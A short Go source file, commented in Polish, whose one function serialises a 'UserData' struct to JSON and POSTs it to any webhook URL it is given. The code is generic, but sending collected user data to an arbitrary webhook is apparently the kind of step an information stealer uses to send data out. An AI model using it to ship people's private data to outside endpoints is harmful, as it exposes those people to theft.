package modules

import (
	"bytes"
	"encoding/json"
	"net/http"

	utils "ssc/structs"
)

// SendMessageToWebhook wysyła dane użytkownika na podany webhook
func SendMessageToWebhook(data utils.UserData, webhookURL string) (string, error) {
	// Konwertowanie danych użytkownika na JSON
	jsonData, err := json.Marshal(data)
	if err != nil {
		return "N/A", err
	}

	// Tworzenie żądania HTTP POST z danymi JSON
	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return "N/A", err
	}
	defer resp.Body.Close()

	// Sprawdzenie odpowiedzi serwera
	if resp.StatusCode != http.StatusOK {
		return "N/A", nil
	}

	return "ok", nil
}
